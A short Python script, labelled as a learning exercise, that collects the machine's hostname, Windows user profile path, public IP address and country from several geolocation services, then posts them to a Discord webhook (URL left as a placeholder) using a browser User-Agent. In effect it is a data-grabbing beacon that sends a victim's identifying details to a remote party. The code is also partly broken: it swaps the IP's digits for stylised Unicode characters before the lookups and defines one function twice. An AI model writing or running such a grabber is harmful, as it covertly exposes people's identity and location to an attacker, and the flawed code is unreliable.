#V1.1 TOOL MADE FOR ME TO LEARN PYTHON BETTER

import json
import urllib.request
import socket
import os

# Discord webhook URL
webhook_url = "YOUR WEBHOOK URL HERE"
def small_numbers(text):
    mapping = str.maketrans("0123456789", "𝟶𝟷𝟸𝟹𝟺𝟻𝟼𝟽𝟾𝟿")
    return text.translate(mapping)

user_profile = os.environ["USERPROFILE"]
hostname = socket.gethostname()
ip_address = json.load(urllib.request.urlopen("https://api.ipify.org?format=json"))["ip"]
ip_address = small_numbers(ip_address)

services = [
    f"http://ip-api.com/json/{ip_address}",
    f"https://ipwho.is/{ip_address}",
    f"https://ipinfo.io/{ip_address}/json"
]

country = "Unknown"

def small_numbers(text):
    mapping = str.maketrans("0123456789", "𝟶𝟷𝟸𝟹𝟺𝟻𝟼𝟽𝟾𝟿")
    return text.translate(mapping)

for url in services:
    try:
        data = json.load(urllib.request.urlopen(url, timeout=3))
        country = data.get("country") or data.get("country_name") or data.get("countryCode") or country
        if country != "Unknown": break
    except: pass

data = {
    "content": (
        f"𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 ■ `{hostname}`\n"
        f"IP: `{ip_address}`\n"
        f"User Profile: `{user_profile}`\n"
        f"Country: `{country}`\n"
    )
}

json_data = json.dumps(data).encode("utf-8")

req = urllib.request.Request(
    webhook_url,
    data=json_data,
    headers={
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0"
    }
)
urllib.request.urlopen(req)
print(f"Sent info: IP: {ip_address}, Country: {country}")
